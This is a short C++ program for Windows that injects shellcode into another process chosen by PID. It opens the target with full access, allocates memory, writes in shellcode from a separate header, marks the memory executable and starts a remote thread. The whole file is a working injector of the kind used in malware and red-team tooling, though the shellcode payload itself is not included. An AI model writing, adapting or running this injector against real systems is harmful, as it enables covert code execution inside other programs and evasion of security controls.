#include <iostream>
#include <windows.h>
#include "shellcode.h"

int main(int argc, char* argv[])
{
    printf("**** API Example! ****\n");

    if (argc != 2) {
        printf("[!] Usage: %s <pid to inject into>\n", argv[0]);
        return EXIT_FAILURE;
    }

    auto pid = atoi(argv[1]);

    if (!pid) {
        printf("[-] Invalid PID: %s\n", argv[1]);
        return EXIT_FAILURE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);;

    if (!hProcess) {
        printf("[-] Failed to open process: %d, LastError: 0x%x\n", pid, GetLastError());
        return EXIT_FAILURE;
    }
    printf("[*] Successfully opened process %d\n", pid);



    size_t shellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);
    printf("[*] Shellcode length: %lld\n", shellcodeSize);
    auto alloc = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!alloc) {
        printf("[-] Failed to allocate memory, LastError: 0x%x\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf("[*] Successfully allocated RW memory at 0x%p of size %lld\n", alloc, shellcodeSize);



    size_t bytesWritten;
    auto result = WriteProcessMemory(hProcess, alloc, &shellcode, shellcodeSize, &bytesWritten);
    if (!result) {
        printf("[-] Failed to write shellcode to memory at 0x%p, LastError: 0x%x\n", alloc, GetLastError());
        return EXIT_FAILURE;
    }
    printf("[*] Successfully wrote shellcode to memory\n");



    DWORD oldProtect;
    result = VirtualProtectEx(hProcess, alloc, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!result) {
        printf("[-] Failed to change permission to RX on memory at 0x%p, LastError: 0x%x\n", alloc, GetLastError());
        return EXIT_FAILURE;
    }
    printf("[*] Successfully changed memory protections to RX\n");



    auto hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)alloc, nullptr, 0, nullptr);
    if (!hThread) {
        printf("[-] Failed to create thread, LastError: 0x%x\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf("[*] Successfully created thread in process\n");



    printf("[+] Shellcode injected using API calls!\n");
    return EXIT_SUCCESS;
}
